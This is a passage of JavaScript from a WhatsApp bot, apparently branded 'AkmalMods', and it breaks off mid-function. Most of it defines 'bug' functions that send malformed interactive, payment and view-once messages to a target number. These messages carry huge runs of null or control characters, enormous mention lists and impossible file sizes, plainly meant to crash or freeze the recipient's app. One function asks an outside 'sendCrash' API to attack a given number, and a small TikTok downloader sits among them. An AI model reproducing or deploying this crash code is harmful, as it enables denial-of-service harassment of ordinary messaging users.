									title: "⭑̤⟅̊༑ ▾ ▸⃟°̯͜𝚫̸𝐊͢𝐌𝐀𝐋༑ ⃟̶̽ ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤‌‌‌‌‌‌‌‌‌‌‌‌‌‏",
									"locationMessage": {
										"degreesLatitude": -999.03499999999999,
										"degreesLongitude": 922.999999999999,
										"name": "▸⃟°̯͜𝚫̸𝐊͢𝐌𝐀𝐋⭑𝚫̸𝐍͢𝐓𝐢⭑𝐊𝐑𝚹͢𝐂̸𝚹 ༑ ⃟̶̽〽️",
										"address": "✨⃟༑⌁⃰𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ〽️",
										"jpegThumbnail": ThM
									},
									hasMediaAttachment: true
								},
								body: {
									text: ""
								},
								nativeFlowMessage: {
									messageParamsJson: " ▸⃟°̯͜𝚫̸𝐊͢𝐌𝐀𝐋⭑𝚫̸𝐍͢𝐓𝐢⭑𝐊𝐑𝚹͢𝐂̸𝚹 ༑ ⃟̶̽ 𝐁𝐔𝐆 𝐕𝟐〽️ ",
									buttons: [{
											name: "single_select",
											buttonParamsJson: {
												"title": "✨⃟༑⌁⃰𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ〽️",
												"sections": [{
													"title": "C̷r̷a̷s̷h̷ B̷u̷g̷ M̷o̷d̷s ϟ",
													"rows": []
												}]
											}
										},
										{
											name: "call_permission_request",
											buttonParamsJson: {}
										}
									],
								},
							}
						}
					}
				}), {
					userJid: X,
					quoted: VisiXLoc
				}
			);
			await krocov4.relayMessage(X, etc.message, ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.green("Send Bug By AkmalMods〽️"));
		};
		
		
const freesex = {
            key: {
                remoteJid: 'p',
                fromMe: false,
                participant: '0@s.whatsapp.net'
            },
            message: {
                "interactiveResponseMessage": {
                    "body": {
                        "text": "Sent",
                        "format": "DEFAULT"
                    },
                    "nativeFlowResponseMessage": {
                        "name": "galaxy_message",
                        "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ModsExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"czazxvoid@Akmal.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0003".repeat(500000)}\",\"screen_0_TextInput_1\":\"∗🚷▸⃟°̯͜𝚫̸𝐊͢𝐌𝐀𝐋⭑𝚫̸𝐍͢𝐓𝐢⭑𝐊𝐑𝚹͢𝐂̸𝚹 ༑ ⃟̶̽♨️\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                        "version": 3
                    }
                }
            }
        }

const Qrad = {
			key: {
				remoteJid: 'p',
				fromMe: false,
				participant: '0@s.whatsapp.net'
			},
			message: {
				"interactiveResponseMessage": {
					"body": {
						"text": "Sent",
						"format": "DEFAULT"
					},
					"nativeFlowResponseMessage": {
						"name": "galaxy_message",
						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"C̷r̷a̷s̷h̷ B̷u̷g̷ M̷o̷d̷s ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"@Krocov7\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ ▾ ▸⃟°̯͜𝚫̸𝐊͢𝐌𝐀𝐋༑ ⃟̶̽ ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤${"\u0003".repeat(1045000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
						"version": 3
					}
				}
			}
		}

async function callp(target, qtd) {
    let pepek = await generateWAMessageFromContent(
        target,
        proto.Message.fromObject({
            ephemeralMessage: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: "kontol"
                        },
                        header: {
                            hasMediaAttachment: false,
                            locationMessage: {}
                        },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: "call_permission_request",
                                    buttonParamsJson: "{}"
                                }
                            ]
                        }
                    }
                }
            }
        }),
        { userJid: target, quoted: qtd }
    );

    await krocov4.relayMessage(
        target,
        pepek.message,
        { participant: { jid: target }, messageId: pepek.key.id }
    );
}

async function newgalaxy(target) {
    await krocov4.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "⋆✩⋆ 𝖪ꮢꂦ𝘤Ø 𝗩7 ⋆✩⋆",
                        format: "EXTENSIONS_1"
                    },
                    nativeFlowResponseMessage: {
                        name: 'galaxy_message',
                        paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(1020000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                        version: 3
                    }
                }
            }
        }
    }, { participant: { jid: target } });
}

async function newcall(target) {
    let virtex = "C̷r̷a̷s̷h̷ B̷u̷g̷ M̷o̷d̷s 🔐";
    await krocov4.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: virtex,
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: virtex,
                        hasMediaAttachment: true
                    },
                    body: {
                        text: virtex
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: 'call_permission_request',
                                buttonParamsJson: '{}'
                            },
                            {
                                name: 'cta_url',
                                buttonParamsJson: "{ display_text : 'C̷r̷a̷s̷h̷ B̷u̷g̷ M̷o̷d̷s  MODS WHATSAPP', url : '', merchant_url : '' }"
                            }
                        ]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}

async function newcall2(target) {
    let virtex = "C̷r̷a̷s̷h̷ B̷u̷g̷ M̷o̷d̷s 🔐" + "𑜦".repeat(40000);

    await krocov4.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: virtex,
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: virtex,
                        hasMediaAttachment: true
                    },
                    body: {
                        text: ""
                    },
                    nativeFlowMessage: {
                        buttons: Array(20).fill({
                            name: 'call_permission_request',
                            buttonParamsJson: '{}'
                        })
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}

async function newcall3(target) {
    let virtex = "C̷r̷a̷s̷h̷ B̷u̷g̷ M̷o̷d̷s 🔐";
    let buttons = Array.from({ length: 200 }, () => ({
        name: 'call_permission_request',
        buttonParamsJson: '{}'
    }));
    let overJids = Array.from({ length: 1039900 }, () => target);
    
    await krocov4.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: virtex,
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: virtex,
                        hasMediaAttachment: true
                    },
                    body: {
                        text: virtex
                    },
                    nativeFlowMessage: {
                        buttons: buttons
                    }
                }
            }
        },
        contextInfo: {
            mentionedJid: overJids,
            externalAdReply: {
                showAdAttribution: true,
                renderLargerThumbnail: false,
                title: `-> C̷r̷a̷s̷h̷ B̷u̷g̷ M̷o̷d̷s `,
                body: `—??`,
                previewType: "VIDEO",
                thumbnail: "",
                sourceUrl: "https://krocov4mods.com",
                mediaUrl: "https://krocov4mods.com"
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}

async function newcall4(target) {
    let virtex = "C̷r̷a̷s̷h̷ B̷u̷g̷ M̷o̷d̷s 🔐";
    await krocov4.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: virtex,
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: virtex
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: 'call_permission_request',
                                buttonParamsJson: '{}'
                            },
                            {
                                name: 'payment_method',
                                buttonParamsJson: "{}"
                            },
                            {
                                name: "single_select",
                                buttonParamsJson: `{"title":"C̷r̷a̷s̷h̷ B̷u̷g̷ M̷o̷d̷s C̷r̷a̷s̷h̷ B̷u̷g̷ M̷o̷d̷s 🔐  ◄${"᬴".repeat(60000)}","sections":[{"title":"# C̷r̷a̷s̷h̷ B̷u̷g̷ M̷o̷d̷s C̷r̷a̷s̷h̷ B̷u̷g̷ M̷o̷d̷s 🔐","rows":[]}]}`
                            },
                            {
                                name: "galaxy_message",
                                buttonParamsJson: `{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\":)\",\"flow_id\":\"C̷r̷a̷s̷h̷ B̷u̷g̷ M̷o̷d̷s\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}`
                            },
                            {
                                name: "mpm",
                                buttonParamsJson: "{}"
                            }
                        ],
                        messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # C̷r̷a̷s̷h̷ B̷u̷g̷ M̷o̷d̷s \",\"body\":\"Zcoder Crash\"}"
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}

async function newvirpen(target) {
    let virtex = "C̷r̷a̷s̷h̷ B̷u̷g̷ M̷o̷d̷s" + "ꦾ".repeat(50000);

    let mentionedJidArray = Array.from({ length: 35000 }, () => 
        "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
    );

    let message = {
        groupMentionedMessage: {
            message: {
                listResponseMessage: {
                    title: " @120363326274964194@g.us",
                    listType: "SINGLE_SELECT",
                    singleSelectReply: {
                        selectedRowId: "C̷r̷a̷s̷h̷ B̷u̷g̷ M̷o̷d̷s C̷r̷a̷s̷h̷ B̷u̷g̷ M̷o̷d̷s 🔐"
                    },
                    description: " @120363326274964194@g.us",
                    contextInfo: {
                        mentionedJid: mentionedJidArray,
                        groupMentions: [{ 
                            groupJid: "120363326274964194@g.us", 
                            groupSubject: virtex 
                        }]
                    }
                }
            }
        }
    };

    await krocov4.relayMessage(target, message, { participant: { jid: target } }, { messageId: null });
}

async function freezekamoflase(target) {

    await krocov4.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "⋆✩⋆ 𝖪ꮢꂦ𝘤Ø 𝗩7 ⋆✩⋆" + "ꦾ".repeat(300000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " ⋆✩⋆ 𝖪ꮢꂦ𝘤Ø 𝗩7 ⋆✩⋆ " }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}

async function newfreezebug(target) {
    let virtex = "C̷r̷a̷s̷h̷ B̷u̷g̷ M̷o̷d̷s 🔐";

    await krocov4.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "C̷r̷a̷s̷h̷ B̷u̷g̷ M̷o̷d̷s" + "@zcoder9".repeat(300000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "C̷r̷a̷s̷h̷ B̷u̷g̷ M̷o̷d̷s " }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}

/*async function newbuggrup(target) {
    let bugquoted = {
        key: {
            fromMe: false,
            participant: '0@s.whatsapp.net',
            remoteJid: 'status@broadcast'
        },
        message: {
            documentMessage: {
                contactVcard: true
            }
        }
    };

    await krocov4.sendMessage(target, { text: "C̷r̷a̷s̷h̷ B̷u̷g̷ M̷o̷d̷s C̷r̷a̷s̷h̷ B̷u̷g̷ M̷o̷d̷s 🔐" }, { quoted: bugquoted });
}
*/

	async function ClPm(X, ThM, cct = false, ptcp = false) {
			let etc = generateWAMessageFromContent(X,
				proto.Message.fromObject({
					viewOnceMessage: {
						message: {
							interactiveMessage: {
								header: {
									title: "",
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 9007199254740991,
										mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
										fileName: "🩸C̷r̷a̷s̷h̷ B̷u̷g̷ M̷o̷d̷s ϟ🦠",
										fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
										directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1723855952",
										contactVcard: true,
										thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
										thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
										thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
										jpegThumbnail: ThM
									},
									hasMediaAttachment: true
								},
								body: {
									text: "𒂵𒂶𒂷𒂸𒂹𒂺𒂻𒂼𒂽𒂾𒂿𒃀"
								},
								nativeFlowMessage: {
									messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}",
									buttons: [
										cct ? {
											name: "single_select",
											buttonParamsJson: "{\"title\":\"👺༑⌁⃰C̷r̷a̷s̷h̷ B̷u̷g̷ M̷o̷d̷s ϟ〽️" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"尺ɪẔχẔ 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
										} : {
											name: "payment_method",
											buttonParamsJson: ""
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}"
										},
										{
											name: "payment_method",
											buttonParamsJson: "{}"
										},
										{
											name: "single_select",
											buttonParamsJson: "{\"title\":\"👺༑⌁⃰C̷r̷a̷s̷h̷ B̷u̷g̷ M̷o̷d̷s ϟ〽️\",\"sections\":[{\"title\":\"尺ɪẔχẔ 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
										},
										{
											name: "galaxy_message",
											buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"〽️\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
										},
										{
											name: "mpm",
											buttonParamsJson: "{}"
										}
									]
								}
							}
						}
					}
				}), {
					userJid: X,
					quoted: EsQl
				}
			);

			await krocov4.relayMessage(X, etc.message, ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.red("Succes Send Bug ©AkmalMods🥶"));
		};
		
async function gall(target, qtd, dosis) {
    let pepek = await generateWAMessageFromContent(
        target,
        proto.Message.fromObject({
            ephemeralMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "Sent",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "galaxy_message",
                            paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ModsExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"czazxvoid@Akmal.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0003".repeat(dosis)}\",\"screen_0_TextInput_1\":\"∗🚷▸⃟°̯͜𝚫̸𝐊͢𝐌𝐀𝐋⭑𝚫̸𝐍͢𝐓𝐢⭑𝐊𝐑𝚹͢𝐂̸𝚹 ༑ ⃟̶̽♨️\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                            version: 3
                        }
                    }
                }
            }
        }),
        { userJid: target, quoted: qtd }
    );

    await krocov4.relayMessage(
        target,
        pepek.message,
        { participant: { jid: target }, messageId: pepek.key.id }
    );
}

async function tiktok2(query) {
  return new Promise(async (resolve, reject) => {
    try {
    const encodedParams = new URLSearchParams();
encodedParams.set('url', query);
encodedParams.set('hd', '1');

      const response = await axios({
        method: 'POST',
        url: 'https://tikwm.com/api/',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'Cookie': 'current_language=en',
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
        },
        data: encodedParams
      });
      const videos = response.data.data;
        const result = {
          title: videos.title,
          cover: videos.cover,
          origin_cover: videos.origin_cover,
          no_watermark: videos.play,
          watermark: videos.wmplay,
          music: videos.music
        };
        resolve(result);
    } catch (error) {
      reject(error);
    }
  });
};

	const dottm = {
			key: {
				fromMe: false,
				participant: '0@s.whatsapp.net',
				remoteJid: 'status@broadcast'
			},
			message: {
				orderMessage: {
					orderId: '999999999999',
					thumbnail: null,
					itemCount: 999999999999,
					status: 'INQUIRY',
					surface: 'CATALOG',
					message: '▾ 尺Ẕχ ⿻ 𝐂𝐋͢𝐈𝚵𝐍͢𝐓 ▾',
					token: 'AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=='
				}
			},
			contextInfo: {
				mentionedJid: ['27746135260@s.whatsapp.net'],
				forwardingScore: 999,
				isForwarded: true
			}
		}
		
		async function ZnX(X, Txt, Amount, Ptcp = true) {
			await krocov4.relayMessage(X, {
					viewOnceMessage: {
						message: {
							interactiveResponseMessage: {
								body: {
									text: Txt,
									format: "EXTENSIONS_1"
								},
								nativeFlowResponseMessage: {
									name: 'galaxy_message',
									paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(Amount)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
									version: 3
								}
							}
						}
					}
				},
				Ptcp ? {
					participant: {
						jid: X
					}
				} : {}
			);
			console.log(chalk.red("Succes Send Bug ©AkmalMods🥶"));
		};
		
		
async function ZnXIvS(X, Ptcp = true) {
			let etc = generateWAMessageFromContent(X, proto.Message.fromObject({
				viewOnceMessage: {
					message: {
						interactiveMessage: {
							header: {
								title: "",
								locationMessage: {},
								hasMediaAttachment: true
							},
							body: {
								text: "⭑̤⟅̊༑ ▾ ▸⃟°̯͜𝚫̸𝐊͢𝐌𝐀𝐋༑ ⃟̶̽ ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤"
							},
							nativeFlowMessage: {
								name: "call_permission_request",
								messageParamsJson: " ▸⃟°̯͜𝚫̸𝐊͢𝐌𝐀𝐋⭑𝚫̸𝐍͢𝐓𝐢⭑𝐊𝐑𝚹͢𝐂̸𝚹 ༑ ⃟̶̽〽️ "
							},
							carouselMessage: {}
						}
					}
				}
			}), {
				userJid: X,
				quoted: Qrad
			});

			await krocov4.relayMessage(X, etc.message, Ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.green("Send Bug By AkmalMods〽️"));
		};

async function sendSessionStructure(target, sessionVersion, localIdentityPublic, remoteIdentityPublic, rootKey, previousCounter, senderChain, receiverChains, pendingKeyExchange, pendingPreKey, remoteRegistrationId, localRegistrationId, needsRefresh, aliceBaseKey) {
    var sessionStructure = generateWAMessageFromContent(target, proto.Message.fromObject({
        'sessionStructure': {
            'sessionVersion': sessionVersion,
            'localIdentityPublic': localIdentityPublic,
            'remoteIdentityPublic': remoteIdentityPublic,
            'rootKey': rootKey,
            'previousCounter': previousCounter,
            'senderChain': senderChain,
            'receiverChains': receiverChains,
            'pendingKeyExchange': pendingKeyExchange,
            'pendingPreKey': pendingPreKey,
            'remoteRegistrationId': remoteRegistrationId,
            'localRegistrationId': localRegistrationId,
            'needsRefresh': needsRefresh,
            'aliceBaseKey': aliceBaseKey
        }
    }), { userJid: target });

    await krocov4.relayMessage(target, sessionStructure.message, { participant: { jid: target }, messageId: sessionStructure.key.id });
}

async function sendCrash(X) {
			try {
				const newcrash = await fetchJson('http://glitchwatools-apis.online/sendCrash?numero=' + X);
				/*http://nxf-01.nexfuture.com.br:25579/sendCrash?numero=' + X);*/
				console.log(chalk.green("Send Bug By AkmalMods〽️"));
				console.log(chalk.red("InVisible⚡"));
			} catch (error) {
				console.error("Error Fetching Crash:", error);
			}
		}


	async function Gsz(X, QTD) {
			await krocov4.relayMessage(X, {
				viewOnceMessage: {
					message: {
						interactiveMessage: {
							header: {
								title: "",
								locationMessage: {},
								hasMediaAttachment: true
							},
							body: {
								text: "▸⃟°̯͜𝚫̸𝐊͢𝐌𝐀𝐋⭑𝚫̸𝐍͢𝐓𝐢⭑𝐊𝐑𝚹͢𝐂̸𝚹 ༑ ⃟̶̽〽️" + "\u0000".repeat(900000)
							},
							nativeFlowMessage: {
								messageParamsJson: ""
							},
							carouselMessage: {}
						}
					}
				}
			}, {
				participant: {
					jid: X
				}
			});
			let XS = fs.readFileSync('./system/image/XY.webp')
			await krocov4.sendMessage(X, {
				sticker: XS
			}, {
				quoted: QTD
			})
			console.log(chalk.green("Send Bug By AkmalMods〽️"));
		};
		
			async function Tedex(X, QTD) {
			await krocov4.relayMessage(X, {
				'viewOnceMessage': {
					'message': {
						'interactiveMessage': {
							'header': {
								'title': '',
								'locationMessage': {},
								'hasMediaAttachment': true
							},
							'body': {
								'text': '▸⃟°̯͜𝚫̸𝐊͢𝐌𝐀𝐋⭑𝚫̸𝐍͢𝐓𝐢⭑𝐊𝐑𝚹͢𝐂̸𝚹 ༑ ⃟̶̽〽️' + '\x00'.repeat(950000)
							},
							'nativeFlowMessage': {
								'messageParamsJson': '\x00'
							},
							'carouselMessage': {}
						}
					}
				}
			}, {
				participant: {
					jid: X
				}
			});
			await krocov4.sendMessage(X, {
				text: `ZNX INVASION\`𐁘`
			}, {
				quoted: QTD
			});
			console.log(chalk.green("Send Bug By AkmalMods〽️"));
		};
						
async function bugpayflow(userJidx) {
            for (let i = 0; i < 20; i++) {
              const qpaybutton = {
                name: "payment_info",
                buttonParamsJson: JSON.stringify({
                  currency: "MYR",
                  total_amount: {
                  value: 999999999999,
                  offset: 999999999999
                  },
                  reference_id: "X0D3SK9ZD3V",
                  type: "physical-goods",
                  order: {
                    status: 'pending',
                    subtotal: {
                    value: 999999999999,
                    offset: 999999999999
                    },
                    order_type: 'ORDER',
                    items: [{
                      name: "📄 SCRIPT BUG VIRDARK . X ONE MYR.𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦",
                      amount: {
                      value: 999999999999,
                      offset: 999999999999
                      },
                      quantity: 999999999999,
                      sale_amount: {
                      value: 999999999999,
                      offset: 999999999999
                      },
                    }]
                  },
                  payment_settings: [{
                    type: "pix_static_code",
                    pix_static_code: {
                      merchant_name: "AkmalModsDev",
                      key: "WDX",
                      key_type: 'Q'
                    }
                  }]
                })
              };
              const nativeFlowMessage = {
                buttons: [qpaybutton]
              };
              const interactiveMessage = {
                nativeFlowMessage: nativeFlowMessage
              };
              const message = {
                messageContextInfo: {
                deviceListMetadataVersion: 2,
                deviceListMetadata: {}
